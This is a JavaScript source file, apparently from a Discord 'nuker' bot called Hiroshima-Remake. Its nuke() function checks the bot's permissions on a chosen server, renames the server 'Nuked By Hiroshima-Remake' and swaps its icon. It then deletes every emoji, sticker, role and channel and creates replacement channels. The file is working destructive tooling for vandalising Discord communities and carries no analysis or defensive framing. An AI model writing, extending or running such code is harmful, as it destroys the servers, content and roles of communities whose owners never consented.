import { ChannelManager } from "./channel.js";
import { RoleManager } from "./role.js";
import checkPermissions from "./checkPermission.js";
import { client } from "../index.js";
import { selectedGuild } from "../alert/getGuild.js";
import EmojiManager from "./emoji.js";
import pc from "picocolors";
import logger from "../logging/logger.js";
export default async function nuke() {
  const guild = await client.guilds.fetch(selectedGuild.id);
  const bot = await guild.members.fetch(client.user.id);

  if (!(await checkPermissions(bot))) return;
  console.log(pc.green(`Nuking Server: ${guild.name}`));
  console.log(pc.yellow("changing the server name..."));
  await logger.info("changing the server name...");
  await guild.setName("Nuked By Hiroshima-Remake");
  console.log(pc.green("server name changed successfully"));
  await logger.info("server name changed successfully");
  console.log(pc.yellow("changing server icon..."));
  await logger.info("changing server icon...");
  await guild.setIcon(
    "https://i.ibb.co/WN9MmvJs/the-kingth-of-kutet-thukuna.jpg"
  );
  console.log(pc.green("server icon changed successfully"));
  await logger.info("server icon changed successfully");

  const deleteEmojis = EmojiManager.deleteAllEmojis(guild);
  const deleteStickers = EmojiManager.deleteAllSticker(guild);
  const deleteRoles = RoleManager.deleteAllRoles(guild);
  const deleteChannels = ChannelManager.deleteAllChannels(guild);

  await deleteEmojis;
  await deleteStickers;
  await deleteRoles;
  await deleteChannels;

  const createChannels = ChannelManager.createChannel(guild);

  await createChannels;
}
